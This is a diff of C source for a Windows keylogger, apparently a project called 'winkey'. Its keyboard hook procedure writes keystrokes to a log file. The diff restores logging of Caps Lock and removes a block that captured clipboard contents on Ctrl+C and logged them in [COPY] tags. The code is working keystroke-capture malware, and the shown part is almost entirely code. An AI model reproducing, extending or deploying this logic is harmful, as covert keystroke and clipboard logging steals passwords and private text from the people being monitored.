@@ -1,4 +1,4 @@
-#include "winkey.h"
+#include <winkey.h>
 #include <debugapi.h>
 #include <winbase.h>
 #include <winerror.h>
@@ -85,10 +85,10 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
                 sprintf_s(inputLog, sizeof(inputLog), "[LSHIFT]");
                 WriteToFile(inputLog);
                 break ;  
-            //case VK_CAPITAL:
-            //    sprintf_s(inputLog, sizeof(inputLog), "[CAPSLOCK]");
-            //    WriteToFile(inputLog);
-            //    break ;
+            case VK_CAPITAL:
+               sprintf_s(inputLog, sizeof(inputLog), "[CAPSLOCK]");
+               WriteToFile(inputLog);
+               break ;
             case VK_TAB:
                 sprintf_s(inputLog, sizeof(inputLog), "[TAB]");
                 WriteToFile(inputLog);
@@ -133,21 +133,6 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
 					if (bytesWritten > 0)
 						WriteToFile(utf8Buffer);
 				}
-                if (GetAsyncKeyState(VK_LCONTROL) && kCode == 'C') // c moche
-                {
-                    DBG("LCTRL + C");
-                    if (!OpenClipboard(NULL))
-                        return 1;
-                    // SetClipboardData(CF_TEXT, NULL);
-                    HANDLE clipB = GetClipboardData(CF_TEXT);
-                    if (!clipB)
-                        CloseClipboard();
-                    char *test = (char*)GlobalLock(clipB);
-                    sprintf_s(inputLog, sizeof(inputLog), "[COPY]%s[/COPY]", test);
-                    WriteToFile(inputLog);
-                    GlobalUnlock(clipB);
-                    CloseClipboard();
-                }
                 break ;
         }
     }
